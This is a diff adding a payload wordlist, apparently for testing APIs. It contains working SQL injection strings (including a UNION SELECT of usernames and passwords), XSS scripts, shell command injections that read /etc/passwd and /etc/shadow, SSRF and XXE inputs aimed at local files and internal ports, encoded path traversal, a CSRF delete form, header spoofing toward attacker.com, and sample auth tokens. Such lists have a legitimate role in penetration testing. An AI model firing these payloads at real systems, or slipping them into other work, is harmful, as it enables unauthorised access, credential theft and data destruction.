@@ -1,0 +1,70 @@
+# SQL Injection Payloads
+' OR 1=1 -- 
+' UNION SELECT null, username, password FROM users -- 
+' OR 'a'='a 
+' AND 1=1 -- 
+' OR 1=1# 
+' OR 'x'='x 
+
+# XSS Payloads for API Headers
+<script>alert('XSS')</script>
+"><script>alert('XSS')</script>
+javascript:alert('XSS')
+%3Cscript%3Ealert('XSS')%3C/script%3E
+
+# Command Injection Payloads
+; ls 
+| ls
+; cat /etc/passwd
+; uname -a
+| cat /etc/shadow
+
+# SSRF (Server-Side Request Forgery) Payloads
+http://127.0.0.1
+http://localhost
+http://example.com
+file:///etc/passwd
+
+# XML External Entity (XXE) Injection Payloads
+<!DOCTYPE foo [ 
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]> <root>&xxe;</root>
+
+# SSRF Through JSON Body
+{"url": "http://localhost:8080"}
+{"url": "http://127.0.0.1:9200"}
+{"image": "http://example.com/payload"}
+
+# API Token Abuse (Testing Auth Headers)
+Bearer XXXXXXXXXXXXXXX
+Authorization: Bearer XXXXXXXXXXXXXXX
+API-KEY: 1234567890abcdef
+Authorization: Basic YWRtaW46cGFzc3dvcmQ=  # Base64 encoded "admin:password"
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMjM0NTY3ODkw
+
+# Path Traversal Payloads
+../../../../etc/passwd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+..%2f..%2f..%2f..%2fetc%2fpasswd
+
+# CSRF (Cross-Site Request Forgery) Payloads
+<form action="http://target-api.com/delete" method="POST">
+  <input type="hidden" name="id" value="1234">
+  <input type="submit" value="Delete">
+</form>
+
+# File Upload Bypass Payloads
+<svg xmlns="http://www.w3.org/2000/svg"><script>alert('XSS')</script></svg>
+data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAOAAAADwCAQAAADN6KOkpAAAAmklEQVR4nOzdbXQVZfvH8c//p6k3q0wqA4hQKMZGkhFEJZfZgxo2Q6IJrTT2nUGm8Re7rf3f0sZAL5V9tD8xjjoM9b3vEXyGMmB2rZXZ0z3XMm2FdoZdXWZqKPyJQ/7oBHvR0nJhdED7JuxqANtckLe/zBQLsrrck3OJO7DZYdtXYcX2mR06W7v9H18z13+fdiZr7ygIuLO1AxMNbg6bcF9Uz6XGQwOXXzxn3g30WBptzR2dC/jl7ZgLhjN1OIgFc37gd/vW5Mmb5ePC2B9d/MZSw7qOCkG/JVGgeIM7nKwJwQ7xvBY4gzx1G8eK3DdFkAvCh8BSCZy8KvddO04AygaX5YGH07EKmFO5oCZrjqFvXcPzq6p8TrcOG0dSHws6Rcn0CG0EF8rfwDhInzxaCKqzxkme+/oQ51JH6hJ3z1dF2f40Scmza97DrRNGz1O9n5vSYxVxXt4Mbn8wDSeSk45XOTVAKtHj9dZzmr/KNjzbc1OthWkwJQUwDL5V6IzFq7LB9wYvk7htbF1Mh1HtwS9lCpTkFbNfHLYA==
+
+# HTTP Header Injection Payloads
+X-Forwarded-For: 127.0.0.1
+X-Forwarded-For: attacker.com
+X-Forwarded-Host: attacksite.com
+
+# JSON Web Token (JWT) Abuse
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.Si2uJzjDSh06gphHfjjjr0YxUo6P0ER_ficTggFhODw
